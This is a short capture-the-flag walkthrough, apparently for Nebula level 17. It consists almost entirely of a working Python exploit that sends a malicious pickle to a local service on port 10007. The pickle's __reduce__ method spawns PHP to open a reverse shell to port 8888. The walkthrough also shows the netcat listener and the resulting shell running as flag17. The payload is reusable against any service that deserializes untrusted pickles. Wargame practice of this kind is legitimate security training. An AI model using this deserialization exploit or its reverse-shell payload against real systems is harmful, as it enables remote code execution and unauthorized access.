```
level17@nebula:/tmp$ cat exploit.py
#!/usr/bin/env python

import socket,pickle,subprocess

class Exploit(object):
  def __reduce__(self):
    fd = 12
    return (subprocess.Popen, (['/usr/bin/php', '-r', '$sock=fsockopen("127.0.0.1",8888);exec("/bin/sh -i <&4 >&4 2>&4");'],))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 10007))
s.send(pickle.dumps(Exploit()))
print s.recv(1024)

level17@nebula:/tmp$ python exploit.py
Accepted connection from 127.0.0.1:36439
```

On another shell:
```
level17@nebula:/home/nebula$ nc -l 8888
sh: no job control in this shell
sh-4.2$ id
id
uid=982(flag17) gid=982(flag17) groups=982(flag17)
sh-4.2$ getflag
getflag
You have successfully executed getflag on a target account
```
## References

 * https://docs.python.org/2/library/pickle.html
 * https://blog.nelhage.com/2011/03/exploiting-pickle/
